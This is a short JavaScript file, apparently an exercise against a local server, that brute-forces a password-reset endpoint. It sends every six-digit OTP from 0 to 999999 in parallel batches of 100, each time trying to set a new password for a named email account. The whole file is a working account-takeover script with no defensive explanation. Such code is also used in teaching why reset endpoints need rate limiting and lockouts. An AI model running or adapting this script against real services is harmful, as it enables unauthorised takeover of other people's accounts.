import axios from "axios";

async function sendRequest(otp) {
  let data = JSON.stringify({
  "email": "shiva@gmail.com",
  "otp": `${otp}`,
  "newPassword": "shivqa"
});

let config = {
  method: 'post',
  url: 'http://localhost:3000/reset-password',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};

  try {
    await axios.request(config);
  } catch (error) {
    console.error(error);
  }
}

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest(i + j))
    }
    await Promise.all(promises);
  }
}

main()